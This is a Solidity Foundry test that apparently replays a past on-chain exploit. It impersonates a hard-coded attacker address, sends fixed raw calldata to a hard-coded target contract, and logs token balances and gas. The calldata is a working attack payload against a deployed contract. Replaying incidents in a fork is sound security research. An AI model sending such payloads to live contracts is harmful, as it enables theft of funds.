// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./TruebitBase.sol";

contract ReplayTest is TruebitBase {
    address constant ATTACKER_ADDR = 0x6C8EC8f14bE7C01672d31CFa5f2CEfeAB2562b50;
    address constant TARGET_ADDR = 0x1De399967B206e446B4E9AeEb3Cb0A0991bF11b8;
    bytes constant INPUT_DATA = hex"64dd891a000000000000000000000000000000000000000000000000016345785d8a0000";

    function testReplay() public {
        beneficiary = ATTACKER_ADDR;
        if (fundingToken == address(0)) vm.deal(address(this), 0);
        _logTokenBalance(fundingToken, beneficiary, "[REPLAY] Before");
        
        uint256 gasBefore = gasleft();
        try this._executeReplay() {
            uint256 gasUsed = gasBefore - gasleft();
            (string memory symbol, uint256 balance, uint8 decimals) = _getTokenData(fundingToken, beneficiary);
            _logTokenBalance(fundingToken, beneficiary, "[REPLAY] After");
            _writeExecutionResult("REPLAY", gasUsed, balance, symbol, decimals);
        } catch Error(string memory reason) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", reason, gasUsed);
            emit log_string(string(abi.encodePacked("[REPLAY] Reverted: ", reason)));
            revert(reason);
        } catch (bytes memory) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", "Low-level revert", gasUsed);
            emit log_string("[REPLAY] Low-level revert");
            revert("Low-level revert");
        }
    }

    function _executeReplay() external {
        vm.startPrank(ATTACKER_ADDR);
        (bool success, bytes memory returnData) = TARGET_ADDR.call(INPUT_DATA);
        if (!success) {
            if (returnData.length > 0) {
                assembly {
                    revert(add(returnData, 32), mload(returnData))
                }
            }
            revert("Replay failed");
        }
        vm.stopPrank();
    }
}
